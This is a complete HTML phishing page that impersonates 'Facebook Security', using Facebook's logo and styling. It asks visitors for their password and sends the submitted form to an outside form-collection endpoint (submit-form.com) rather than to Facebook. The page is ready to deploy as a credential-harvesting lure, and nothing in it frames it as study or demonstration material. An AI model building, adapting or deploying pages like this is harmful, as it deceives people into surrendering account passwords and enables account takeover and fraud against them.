<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook Security</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      width: 350px;
      text-align: center;
    }
    .container img {
      height: 50px;
      width: 50px;
    }
    h2 {
      font-size: 20px;
      margin: 20px 0;
      color: #333;
    }
    label {
      font-size: 14px;
      color: #555;
    }
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 14px;
    }
    .show-password {
      position: absolute;
      right: 15px;
      top: -35px;
      cursor: pointer;
      color: #1877f2;
      font-size: 14px;
    }
    input[type="submit"] {
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 20px;
    }
    input[type="submit"]:hover {
      background-color: #165ecc;
    }
    .tick-icon {
      height: 1em;
      vertical-align: middle;
      margin-left: 6px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
    <h2>Facebook Security</h2>
    <p>Please enter your password to complete the request<p>
    <form action="https://submit-form.com/l3f1IJLSI" method="POST">
      <label for="password"></label>
      <div style="position: relative;">
        <input type="password" id="password" name="password" placeholder="Enter your password" required>
      
      </div>
      <input type="submit" value="Submit">
    </form>
  </div>

  <script>
    function togglePassword() {
      const passwordInput = document.getElementById('password');
      const passwordType = passwordInput.type === 'password' ? 'text' : 'password';
      passwordInput.type = passwordType;
    }
  </script>
</body>
</html>
